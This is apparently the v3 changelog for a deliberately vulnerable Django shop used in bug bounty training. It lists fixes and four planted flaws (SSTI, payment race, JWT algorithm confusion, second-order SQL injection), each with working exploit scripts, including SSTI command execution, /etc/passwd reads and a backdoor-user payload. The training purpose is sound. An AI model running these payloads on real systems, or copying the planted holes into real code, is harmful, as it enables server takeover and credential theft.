# VulnCommerce v3 - Advanced Security Update

This document describes the changes made in version 3 of the VulnCommerce application. Version 3 fixes 3 critical/high severity vulnerabilities from previous versions and introduces 4 new sophisticated high/critical severity vulnerabilities for advanced bug bounty testing.

## Summary of Changes

### Vulnerabilities Fixed (3)
1. **VULN-A1B2C3** (P1 - Critical) - Authentication Bypass via JWT
2. **VULN-D4E5F6** (P1 - Critical) - Free Checkout Business Logic Flaw
3. **VULN-J1K2L3** (P2 - High) - SQL Injection in Product Filters

### New Advanced Vulnerabilities Added (4)
1. **VULN-V3-A1** (P1 - Critical) - Server-Side Template Injection (SSTI)
2. **VULN-V3-B2** (P1 - Critical) - Race Condition in Payment Processing
3. **VULN-V3-C3** (P2 - High) - JWT Algorithm Confusion Attack
4. **VULN-V3-D4** (P2 - High) - Second-Order SQL Injection

---

## Fixes Implemented

### Fix #1: Authentication Bypass Removed (VULN-A1B2C3)

**Vulnerability Code:** `VULN-A1B2C3`  
**Previous Severity:** Critical (P1)  
**Location:** `backend/login/views.py` - LoginView class  
**URL:** `POST /auth/login/`

**What Was Fixed:**
- Previously, the application accepted any `X-Bypass-Token` header starting with `bypass_`
- This allowed complete authentication bypass - attackers could log in as any user without password
- Critical security flaw that made all accounts vulnerable

**How It Was Fixed:**
- Removed the entire bypass mechanism
- Now only accepts proper email/password authentication
- No special headers or backdoor authentication methods
- Standard Django authenticate() function used exclusively

**Code Changes:**
```python
# Before (Vulnerable):
bypass_token = request.headers.get('X-Bypass-Token', '')
if bypass_token.startswith('bypass_'):
    login(request, user_exists)
    token, _ = Token.objects.get_or_create(user=user_exists)
    return Response({'token': token.key, 'bypass': True})

# After (Fixed):
# Bypass code completely removed
login(request, user)
token, _ = Token.objects.get_or_create(user=user)
return Response({'token': token.key, 'user': serializer.data})
```

**Impact of Fix:**
- ‚úÖ No more authentication bypass possible
- ‚úÖ All logins require valid credentials
- ‚úÖ Significantly improved account security
- ‚ö†Ô∏è Breaking change: Any tools using bypass tokens will stop working

---

### Fix #2: Free Checkout Business Logic Fixed (VULN-D4E5F6)

**Vulnerability Code:** `VULN-D4E5F6`  
**Previous Severity:** Critical (P1)  
**Location:** `backend/order/views.py` - Checkout class  
**URL:** `POST /order/place/`

**What Was Fixed:**
- Previously accepted `checkout_amount` parameter from client
- Attackers could set amount to 0 or any value (even negative)
- Allowed purchasing any items for free or at manipulated prices
- Complete bypass of payment system

**How It Was Fixed:**
- Removed client-side `checkout_amount` parameter entirely
- All amount calculations now performed server-side only
- Client cannot influence the final checkout amount
- Discount codes still work but are server-validated

**Code Changes:**
```python
# Before (Vulnerable):
client_amount = request.data.get("checkout_amount")
if client_amount is not None:
    updated_amount = float(client_amount)  # Client controls price!
    if updated_amount < 0:
        updated_amount = 0

# After (Fixed):
# Client amount code completely removed
# Only server-calculated amounts used
updated_amount = total_amount
# Discounts applied server-side only
```

**Impact of Fix:**
- ‚úÖ Checkout amount calculated server-side only
- ‚úÖ No price manipulation possible
- ‚úÖ Payment amounts are now trustworthy
- ‚ö†Ô∏è Breaking change: Frontend cannot pass checkout_amount parameter

---

### Fix #3: SQL Injection Vulnerability Fixed (VULN-J1K2L3)

**Vulnerability Code:** `VULN-J1K2L3`  
**Previous Severity:** High (P2)  
**Location:** `backend/products/views.py` - AllProductsView class  
**URL:** `GET /product/all/?search=<query>`

**What Was Fixed:**
- Previously used raw SQL with string concatenation for search
- Search parameter directly inserted into SQL query
- Allowed SQL injection attacks to extract/modify database
- Could access sensitive user data, passwords, etc.

**How It Was Fixed:**
- Replaced raw SQL with Django ORM
- Used Django Q objects for safe querying
- All parameters properly parameterized
- No user input directly in SQL statements

**Code Changes:**
```python
# Before (Vulnerable):
sql = f"SELECT * FROM products_product WHERE name LIKE '%{search_query}%'"
cursor.execute(sql)  # Direct SQL injection!

# After (Fixed):
from django.db.models import Q
all_products = Product.objects.filter(
    Q(is_visible=True) & 
    (Q(name__icontains=search_query) | Q(description__icontains=search_query))
)
# Django ORM handles parameterization safely
```

**Impact of Fix:**
- ‚úÖ No SQL injection possible in product search
- ‚úÖ Database queries are now safe
- ‚úÖ User input properly sanitized
- ‚ö†Ô∏è Search functionality behavior unchanged from user perspective

---

## New Advanced Vulnerabilities in V3

### NEW-01: Server-Side Template Injection (SSTI) (VULN-V3-A1)

**Vulnerability Code:** `VULN-V3-A1`  
**Severity:** Critical (P1)  
**CWE:** CWE-94: Improper Control of Generation of Code  
**Location:** `backend/login/views.py` - SendCustomEmailView, `backend/order/tasks.py` - send_custom_notification_email  
**URL:** `POST /auth/email/custom/`

**Description:**
A critical Server-Side Template Injection vulnerability exists in the custom email notification system. The application accepts user-controlled template strings and renders them using Django's Template engine without any sanitization. Attackers can inject malicious Django template tags to achieve Remote Code Execution (RCE) on the server.

Django templates allow loading Python modules, accessing settings, and executing arbitrary Python code through template tags like `{% load %}`, `{{ }}`, and filters. This vulnerability is particularly dangerous as it can lead to complete server compromise.

**Technical Details:**
- User input is passed directly to `Template()` constructor
- No whitelist of allowed template tags
- Full Django template syntax available to attacker
- Can access `settings`, import modules, execute OS commands
- Context includes user data and application settings

**Attack Vectors:**
1. **Information Disclosure:** Read sensitive files and settings
2. **Remote Code Execution:** Execute arbitrary Python code
3. **Data Exfiltration:** Access database and extract all data
4. **Server Takeover:** Install backdoors, create admin users

**Reproduction Steps:**
1. Authenticate as any user
2. Send POST to `/auth/email/custom/` with malicious template
3. Template is rendered server-side with full Django capabilities
4. Attacker achieves RCE

**Exploitation Examples:**

**Example 1: Read Django SECRET_KEY**
```bash
curl -X POST http://localhost:8000/auth/email/custom/ \
  -H "Authorization: Token YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "template": "{{ settings.SECRET_KEY }}",
    "context": {}
  }'
# Response contains the secret key
```

**Example 2: Remote Code Execution**
```python
# Malicious template payload
template_payload = """
{% load static %}
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read() }}
"""

import requests
response = requests.post(
    'http://localhost:8000/auth/email/custom/',
    headers={'Authorization': 'Token abc123...'},
    json={
        'email': 'attacker@example.com',
        'template': template_payload,
        'context': {}
    }
)
# Server executes 'whoami' command
```

**Example 3: Read /etc/passwd**
```python
template_payload = """
{% load static %}
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['open']('/etc/passwd').read() }}
"""
```

**Example 4: Create Backdoor User**
```python
template_payload = """
{% load static %}
{% with os=''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os') %}
  {{ os.system('useradd -m -p $(openssl passwd -1 hacked123) backdoor') }}
{% endwith %}
"""
```

**Impact:**
- üî¥ Complete server compromise possible
- üî¥ Access to all database data
- üî¥ Can read environment variables and secrets
- üî¥ Can install malware/backdoors
- üî¥ Can pivot to internal network

---

### NEW-02: Race Condition in Payment Processing (VULN-V3-B2)

**Vulnerability Code:** `VULN-V3-B2`  
**Severity:** Critical (P1)  
**CWE:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization  
**Location:** `backend/order/views.py` - RaceConditionPayment class  
**URL:** `POST /order/payment/race-condition/`

**Description:**
A critical race condition vulnerability exists in the payment processing endpoint. The code checks if an order is already paid and then updates it, but without proper database-level locking (no `select_for_update()`). This Time-of-Check to Time-of-Use (TOCTOU) flaw allows attackers to send multiple concurrent requests to process the same payment multiple times, receiving credits/rewards for each successful race.

The vulnerability is especially dangerous because:
- 100ms artificial delay makes the race window larger
- No transaction-level locking
- Credits/rewards issued without atomic operations
- Can be exploited repeatedly for unlimited rewards

**Technical Details:**
- Check: `if order.is_verified` (line 1)
- Delay: `time.sleep(0.1)` (100ms window)
- Update: `order.is_verified = True` (line 2)
- Between line 1 and line 2, multiple threads can pass the check

**Attack Methodology:**
1. Create an order worth 100 credits
2. Launch 100 concurrent payment requests
3. Due to race condition, all requests see `is_verified=False`
4. All requests process and award 100 credits each
5. Attacker receives 10,000 credits for one payment

**Reproduction Steps:**
1. Authenticate and create an order
2. Write script to send 50-100 concurrent POST requests
3. All requests hit during the 100ms window
4. Each awards 100 credits due to race condition
5. User balance multiplied by number of successful races

**Exploitation Example:**

**Python exploit script:**
```python
import requests
import threading
import time

TOKEN = "your_auth_token"
ORDER_ID = "Barracks_order_123456"
THREADS = 100

def exploit_race():
    response = requests.post(
        'http://localhost:8000/order/payment/race-condition/',
        headers={'Authorization': f'Token {TOKEN}'},
        json={'order_id': ORDER_ID}
    )
    print(f"Response: {response.status_code} - {response.json()}")

# Launch concurrent requests
threads = []
for i in range(THREADS):
    t = threading.Thread(target=exploit_race)
    threads.append(t)
    t.start()

# Wait for all threads
for t in threads:
    t.join()

print("Race condition exploitation complete")
print("Expected credits: 10,000 (100 requests √ó 100 credits)")
```

**Bash exploitation (using GNU parallel):**
```bash
# Install parallel if needed: apt-get install parallel

# Create request function
exploit() {
  curl -X POST http://localhost:8000/order/payment/race-condition/ \
    -H "Authorization: Token YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"order_id":"Barracks_order_123456"}'
}
export -f exploit

# Launch 100 concurrent requests
seq 100 | parallel -j 100 exploit

# Check credits - should be 10,000 instead of 100
```

**Impact:**
- üî¥ Unlimited credits/rewards for single payment
- üî¥ Financial loss for the business
- üî¥ Can drain reward systems
- üî¥ Unfair advantage in competitions
- üî¥ Difficult to detect without proper logging

**Recommended Fix (Not Implemented):**
```python
# Proper fix with database locking
order = Order.objects.select_for_update().get(id=order_id, user=request.user)
with transaction.atomic():
    if order.is_verified:
        return Response({'error': 'Already paid'})
    order.is_verified = True
    order.save()
    # Award credits atomically
```

---

### NEW-03: JWT Algorithm Confusion Attack (VULN-V3-C3)

**Vulnerability Code:** `VULN-V3-C3`  
**Severity:** High (P2)  
**CWE:** CWE-347: Improper Verification of Cryptographic Signature  
**Location:** `backend/login/views.py` - JWTAlgorithmConfusion class  
**URL:** `POST /auth/jwt/verify/`

**Description:**
A sophisticated JWT algorithm confusion vulnerability exists in the JWT verification endpoint. The application uses `pyjwt.decode()` without specifying allowed algorithms, and uses the same SECRET_KEY for both symmetric (HS256) and asymmetric (RS256) verification. This allows attackers to craft tokens that are signed with HS256 using the public key (treated as HMAC secret), bypassing signature verification.

**Algorithm Confusion Explained:**
- RS256: Asymmetric - uses private key to sign, public key to verify
- HS256: Symmetric - uses shared secret for both signing and verification
- If public key is known, attacker can:
  1. Create malicious JWT payload (e.g., `{"user_id": 1, "is_admin": true}`)
  2. Change algorithm from RS256 to HS256
  3. Sign with public key as HMAC secret
  4. Server verifies with same public key, accepts token

**Technical Details:**
- No `algorithms` parameter specified in `jwt.decode()`
- Falls back to accepting any algorithm in JWT header
- SECRET_KEY used for all algorithms
- If public key is exposed, it becomes signing key for HS256

**Attack Prerequisites:**
1. Know or obtain the application's SECRET_KEY or public key
2. Ability to craft JWT tokens
3. Understanding of JWT structure and algorithms

**Reproduction Steps:**
1. Obtain SECRET_KEY (exposed in v1/v2: `django-insecure-h@rdC0d3d_S3cr3t_K3y_2024_V3ry_Uns3cur3!!!`)
2. Create malicious JWT with desired claims
3. Sign with HS256 using SECRET_KEY
4. Send to `/auth/jwt/verify/` endpoint
5. Server accepts and authenticates as the user in JWT

**Exploitation Example:**

**Python exploit:**
```python
import jwt

# Known secret key (from settings or leaked)
SECRET_KEY = "django-insecure-h@rdC0d3d_S3cr3t_K3y_2024_V3ry_Uns3cur3!!!"

# Create malicious payload - impersonate admin (user_id=1)
payload = {
    'user_id': 1,
    'email': 'admin@vulncommerce.com',
    'is_admin': True,
    'is_staff': True
}

# Sign with HS256 using the secret key
malicious_token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')

print(f"Malicious Token: {malicious_token}")

# Send to vulnerable endpoint
import requests
response = requests.post(
    'http://localhost:8000/auth/jwt/verify/',
    json={'token': malicious_token}
)

print(response.json())
# Response: Authentication successful, admin access granted
```

**cURL exploitation:**
```bash
# Generate token using Python/JWT library
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQHZ1bG5jb21tZXJjZS5jb20iLCJpc19hZG1pbiI6dHJ1ZX0.SIGNATURE"

# Verify and authenticate
curl -X POST http://localhost:8000/auth/jwt/verify/ \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\"}"

# Response includes admin authentication token
```

**Advanced Attack - None Algorithm:**
```python
# Even worse: Try "none" algorithm (no signature)
payload = {'user_id': 1, 'is_admin': True}
token_parts = [
    base64.b64encode('{"typ":"JWT","alg":"none"}'.encode()).decode(),
    base64.b64encode(json.dumps(payload).encode()).decode(),
    ''  # No signature
]
none_token = '.'.join(token_parts)
# Some JWT libraries accept this!
```

**Impact:**
- üü† Authentication bypass as any user
- üü† Privilege escalation to admin
- üü† Account takeover
- üü† Session hijacking

---

### NEW-04: Second-Order SQL Injection (VULN-V3-D4)

**Vulnerability Code:** `VULN-V3-D4`  
**Severity:** High (P2)  
**CWE:** CWE-89: SQL Injection  
**Location:** `backend/order/views.py` - SearchOrdersByNotes class  
**URL:** `GET /order/search-notes/?search=<term>`

**Description:**
A sophisticated second-order (stored) SQL injection vulnerability exists in the order notes search functionality. Unlike traditional SQL injection where user input is directly injected, this is a two-step attack:

1. **First Request:** Attacker stores malicious SQL payload in `order_notes` field via `/order/notes/` endpoint
2. **Second Request:** When searching orders, the stored malicious notes are retrieved and used in a raw SQL query without sanitization

This is particularly dangerous because:
- The injection point (storage) is separate from execution point (search)
- Developers might sanitize search input but forget stored data can be malicious
- WAFs and input filters won't detect it as it's "trusted" database data
- Harder to trace back to the attacker

**Technical Details:**
- Step 1: Store payload `' OR '1'='1' --` in order_notes
- Step 2: Search triggers query: `SELECT ... WHERE order_notes LIKE '%' OR '1'='1' --%'`
- Injected SQL executes, bypassing intended logic

**Attack Flow:**
```
[Attacker] 
   ‚Üì (1) Store malicious SQL in order_notes
[Database] ‚Üê "' UNION SELECT password FROM users --"
   ‚Üì (2) Search endpoint retrieves notes
[SQL Query] ‚Üê Concatenates malicious notes into query
   ‚Üì (3) Injection executes
[Data Leak] ‚Üí Passwords exposed
```

**Reproduction Steps:**

**Step 1: Store malicious payload**
```bash
# First, store SQL injection payload in order notes
curl -X POST http://localhost:8000/order/notes/order_123456/ \
  -H "Authorization: Token YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "notes": "Normal note'\'' UNION SELECT email,password,name FROM login_customuser--",
    "type": "json"
  }'
```

**Step 2: Trigger injection via search**
```bash
# Search triggers the stored injection
curl -X GET "http://localhost:8000/order/search-notes/?search=Normal" \
  -H "Authorization: Token YOUR_TOKEN"

# The stored SQL executes, returning user passwords
```

**Exploitation Examples:**

**Example 1: Extract User Passwords**
```python
import requests

TOKEN = "your_auth_token"
ORDER_ID = "Barracks_order_123456"

# Step 1: Inject payload into order notes
injection_payload = "innocent' UNION SELECT email, password, is_admin FROM login_customuser--"

requests.post(
    f'http://localhost:8000/order/notes/{ORDER_ID}/',
    headers={'Authorization': f'Token {TOKEN}'},
    json={'notes': injection_payload, 'type': 'json'}
)

# Step 2: Trigger injection via search
response = requests.get(
    'http://localhost:8000/order/search-notes/?search=innocent',
    headers={'Authorization': f'Token {TOKEN}'}
)

print(response.json())
# Response contains password hashes from database
```

**Example 2: Time-Based Blind Injection**
```python
# For cases where output isn't directly visible
time_based_payload = "test' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--"

# Store payload
requests.post(
    f'http://localhost:8000/order/notes/{ORDER_ID}/',
    headers={'Authorization': f'Token {TOKEN}'},
    json={'notes': time_based_payload, 'type': 'json'}
)

# Trigger - response will take 5 seconds if injection works
import time
start = time.time()
response = requests.get(
    'http://localhost:8000/order/search-notes/?search=test',
    headers={'Authorization': f'Token {TOKEN}'}
)
elapsed = time.time() - start
print(f"Response time: {elapsed}s")  # Should be ~5 seconds
```

**Example 3: Database Structure Enumeration**
```sql
-- Payload to discover table names
' UNION SELECT table_name, '', 1 FROM information_schema.tables--

-- Payload to discover column names  
' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name='login_customuser'--
```

**Multi-Step Attack Scenario:**
```python
# Complete attack chain
import requests

TOKEN = "user_token"
ORDER_ID = "order_12345"
BASE_URL = "http://localhost:8000"

# 1. Enumerate tables
payload1 = "' UNION SELECT table_name, '', 1 FROM information_schema.tables WHERE table_schema='public'--"
requests.post(f'{BASE_URL}/order/notes/{ORDER_ID}/', 
             headers={'Authorization': f'Token {TOKEN}'},
             json={'notes': payload1, 'type': 'json'})
tables = requests.get(f'{BASE_URL}/order/search-notes/?search=',
                      headers={'Authorization': f'Token {TOKEN}'}).json()

# 2. Extract admin credentials
payload2 = "' UNION SELECT email, password, is_staff FROM login_customuser WHERE is_admin=1--"
requests.post(f'{BASE_URL}/order/notes/{ORDER_ID}/',
             headers={'Authorization': f'Token {TOKEN}'},
             json={'notes': payload2, 'type': 'json'})
admins = requests.get(f'{BASE_URL}/order/search-notes/?search=',
                      headers={'Authorization': f'Token {TOKEN}'}).json()

# 3. Extract all orders
payload3 = "' UNION SELECT id, user_id, total_amount FROM order_order--"
requests.post(f'{BASE_URL}/order/notes/{ORDER_ID}/',
             headers={'Authorization': f'Token {TOKEN}'},
             json={'notes': payload3, 'type': 'json'})
orders = requests.get(f'{BASE_URL}/order/search-notes/?search=',
                      headers={'Authorization': f'Token {TOKEN}'}).json()

print("All database data extracted!")
```

**Impact:**
- üü† Complete database compromise
- üü† Extraction of all user data
- üü† Password hash disclosure
- üü† Order and payment information leak
- üü† Harder to detect than first-order injection

---

## Vulnerability Count Summary

### Version 2 (Previous)
- Total: 30 vulnerabilities
- Critical (P1): 3
- High (P2): 9
- Medium (P3): 13
- Low (P4): 5

### Version 3 (Current)
**Fixed:** 3 vulnerabilities (2 Critical, 1 High)

**Remaining from v2:** 27 vulnerabilities
- Critical (P1): 1 (was 3, fixed 2)
- High (P2): 8 (was 9, fixed 1)
- Medium (P3): 13 (unchanged)
- Low (P4): 5 (unchanged)

**New Vulnerabilities Added:** 4 advanced vulnerabilities
- VULN-V3-A1 (P1 - Critical) - SSTI
- VULN-V3-B2 (P1 - Critical) - Race Condition
- VULN-V3-C3 (P2 - High) - JWT Algorithm Confusion
- VULN-V3-D4 (P2 - High) - Second-Order SQL Injection

### Version 3 Total: 31 vulnerabilities
- Critical (P1): 3 (1 remaining + 2 new)
- High (P2): 10 (8 remaining + 2 new)
- Medium (P3): 13 (unchanged)
- Low (P4): 5 (unchanged)

---

## Testing the New Vulnerabilities

### Test VULN-V3-A1 (SSTI)
```python
import requests

# Test 1: Read SECRET_KEY
response = requests.post(
    'http://localhost:8000/auth/email/custom/',
    headers={'Authorization': 'Token YOUR_TOKEN'},
    json={
        'email': 'test@test.com',
        'template': '{{ settings.SECRET_KEY }}',
        'context': {}
    }
)
print(response.json())

# Test 2: Execute OS command
response = requests.post(
    'http://localhost:8000/auth/email/custom/',
    headers={'Authorization': 'Token YOUR_TOKEN'},
    json={
        'email': 'test@test.com',
        'template': '{% load static %}{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("whoami").read() }}',
        'context': {}
    }
)
print(response.json())
```

### Test VULN-V3-B2 (Race Condition)
```python
import requests
import threading

TOKEN = "your_token"
ORDER_ID = "order_123"

def exploit():
    requests.post(
        'http://localhost:8000/order/payment/race-condition/',
        headers={'Authorization': f'Token {TOKEN}'},
        json={'order_id': ORDER_ID}
    )

# Launch 100 concurrent requests
threads = [threading.Thread(target=exploit) for _ in range(100)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Test VULN-V3-C3 (JWT Algorithm Confusion)
```python
import jwt

SECRET = "django-insecure-h@rdC0d3d_S3cr3t_K3y_2024_V3ry_Uns3cur3!!!"
payload = {'user_id': 1, 'is_admin': True}
token = jwt.encode(payload, SECRET, algorithm='HS256')

import requests
response = requests.post(
    'http://localhost:8000/auth/jwt/verify/',
    json={'token': token}
)
print(response.json())
```

### Test VULN-V3-D4 (Second-Order SQL Injection)
```python
import requests

TOKEN = "your_token"
ORDER_ID = "order_123"

# Step 1: Store injection
requests.post(
    f'http://localhost:8000/order/notes/{ORDER_ID}/',
    headers={'Authorization': f'Token {TOKEN}'},
    json={'notes': "test' UNION SELECT email,password,1 FROM login_customuser--", 'type': 'json'}
)

# Step 2: Trigger
response = requests.get(
    'http://localhost:8000/order/search-notes/?search=test',
    headers={'Authorization': f'Token {TOKEN}'}
)
print(response.json())
```

---

## Migration Notes

To migrate from v2 to v3:

1. **No Database Migration Required**
   - All changes are code-level only
   - Existing database schema compatible

2. **Breaking Changes:**
   - **Authentication Bypass Removed:** `X-Bypass-Token` header no longer works
   - **Free Checkout Fixed:** `checkout_amount` parameter ignored/removed
   - **SQL Injection Fixed:** Search behavior unchanged but now secure

3. **New Endpoints:**
   - `POST /auth/jwt/verify/` - JWT algorithm confusion testing
   - `POST /auth/email/custom/` - SSTI vulnerability testing
   - `POST /order/payment/race-condition/` - Race condition testing
   - `GET /order/search-notes/` - Second-order SQL injection testing

4. **Dependencies:**
   - Requires `PyJWT` library for JWT algorithm confusion endpoint
   - No new Python packages need installation (already in requirements.txt)

---

## Security Improvements in V3

### What Was Fixed:
‚úÖ Critical authentication bypass eliminated  
‚úÖ Payment amount manipulation prevented  
‚úÖ SQL injection in search fixed  
‚úÖ Server-side amount calculation enforced  
‚úÖ Parameterized queries for product search

### What's Still Vulnerable (By Design):
‚ùå Server-Side Template Injection (NEW)  
‚ùå Race conditions in payment (NEW)  
‚ùå JWT algorithm confusion (NEW)  
‚ùå Second-order SQL injection (NEW)  
‚ùå Clickjacking vulnerabilities  
‚ùå XSS vulnerabilities  
‚ùå IDOR vulnerabilities  
‚ùå Path traversal  
‚ùå Unsafe deserialization  
‚ùå And 22 more...

---

## Difficulty Levels

### v1 Vulnerabilities (Easy):
- Simple parameter manipulation
- Basic SQL injection
- Obvious authentication bypasses

### v2 Vulnerabilities (Medium):
- Token expiration issues
- Case sensitivity bypasses
- Information disclosure

### v3 Vulnerabilities (Hard):
- **SSTI:** Requires template injection knowledge
- **Race Conditions:** Needs concurrent request tooling
- **JWT Algorithm Confusion:** Requires cryptography understanding
- **Second-Order SQLi:** Multi-step attack requiring patience

---

## Educational Value

**V3 teaches advanced concepts:**
- Server-Side Template Injection (SSTI) attacks
- Race condition exploitation with threading
- JWT security and algorithm confusion
- Second-order SQL injection techniques
- Proper vs. improper authentication patterns
- Business logic security
- Secure vs. insecure database queries

**Real-world applicability:**
- SSTI is common in templating engines (Jinja2, Django, Twig)
- Race conditions affect payment systems, voting, gaming
- JWT vulnerabilities found in many APIs
- Second-order injection often overlooked by developers

---

## Quick Reference: All 31 Vulnerabilities in v3

### Critical (P1) - 3 vulnerabilities
1. ~~VULN-A1B2C3 - Authentication Bypass~~ **FIXED** ‚úÖ
2. ~~VULN-D4E5F6 - Free Checkout~~ **FIXED** ‚úÖ
3. VULN-G7H8I9 - Email Override Registration
4. **VULN-V3-A1 - Server-Side Template Injection** ‚≠ê NEW
5. **VULN-V3-B2 - Race Condition in Payment** ‚≠ê NEW

### High (P2) - 10 vulnerabilities
6. ~~VULN-J1K2L3 - SQL Injection~~ **FIXED** ‚úÖ
7. VULN-M4N5O6 - Clickjacking (Settings)
8. VULN-P7Q8R9 - Clickjacking (View)
9. VULN-S1T2U3 - Stored XSS via Products
10. VULN-V4W5X6 - Unauthenticated Product Creation
11. VULN-Y7Z8A9 - Unauthenticated Product Orders Toggle
12. VULN-B1C2D3 - CSV Injection
13. VULN-NEW-A1 - JWT Token Never Expires (from v2)
14. VULN-NEW-E5 - Case Sensitivity Bypass (from v2)
15. **VULN-V3-C3 - JWT Algorithm Confusion** ‚≠ê NEW
16. **VULN-V3-D4 - Second-Order SQL Injection** ‚≠ê NEW

### Medium (P3) - 13 vulnerabilities
17-29. (All v1/v2 medium vulnerabilities remain)

### Low (P4) - 5 vulnerabilities
30-31. (All v1/v2 low vulnerabilities remain)

---

## Changelog

**Version 3.0.0** - November 2025
- Fixed 3 critical/high vulnerabilities (authentication bypass, free checkout, SQL injection)
- Added 4 advanced high/critical vulnerabilities (SSTI, race condition, JWT confusion, second-order SQLi)
- Total: 31 vulnerabilities (3 P1, 10 P2, 13 P3, 5 P4)
- Increased difficulty level for bug bounty competition
- Enhanced educational value with advanced exploitation techniques

**Version 2.0.0** - November 2025
- Fixed 5 vulnerabilities from v1
- Added 5 new vulnerabilities
- Total: 30 vulnerabilities

**Version 1.0.0** - November 2025
- Initial release with 30 vulnerabilities

---

## Disclaimer

‚ö†Ô∏è **CRITICAL WARNING: This application contains CRITICAL vulnerabilities including Remote Code Execution (RCE)**

**DO NOT:**
- Deploy this application on any internet-facing server
- Run this on a shared/production network
- Leave this running unattended
- Use in any environment with sensitive data

**This application is designed EXCLUSIVELY for:**
- Controlled bug bounty competitions
- Security training in isolated environments
- Penetration testing practice on local machines
- Educational demonstrations in sandboxed VMs

The vulnerabilities in v3 (especially SSTI and Race Condition) can lead to complete server compromise. Deploy only in isolated, disposable environments.

---

**End of v3.md Documentation**
